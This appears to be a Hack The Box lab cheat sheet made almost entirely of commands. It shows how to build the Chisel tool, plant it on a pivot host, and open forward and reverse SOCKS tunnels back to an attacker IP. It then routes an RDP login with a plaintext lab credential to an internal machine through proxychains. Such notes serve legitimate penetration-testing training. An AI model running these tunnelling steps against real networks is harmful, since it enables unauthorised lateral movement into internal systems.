```shell-session
AhmaDb0x@htb[/htb]$ git clone https://github.com/jpillora/chisel.git
```

```shell-session
AhmaDb0x@htb[/htb]$ cd chisel
go build
```
#### Transferring Chisel Binary to Pivot Host
```shell-session
AhmaDb0x@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/
```
#### Running the Chisel Server on the Pivot Host
```shell-session
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
```
#### Connecting to the Chisel Server
```shell-session
AhmaDb0x@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks
```
#### Editing & Confirming proxychains.conf
```shell-session
AhmaDb0x@htb[/htb]$ tail -f /etc/proxychains.conf 

#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```
---
```shell-session
AhmaDb0x@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

---
## Chisel Reverse Pivot
```shell-session
AhmaDb0x@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5
```

```shell-session
ubuntu@WEB01$ ./chisel client -v 10.10.15.81:1234 R:socks
```
#### Editing & Confirming proxychains.conf

```shell-session
socks5 127.0.0.1 1080 
```


```shell-session
AhmaDb0x@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

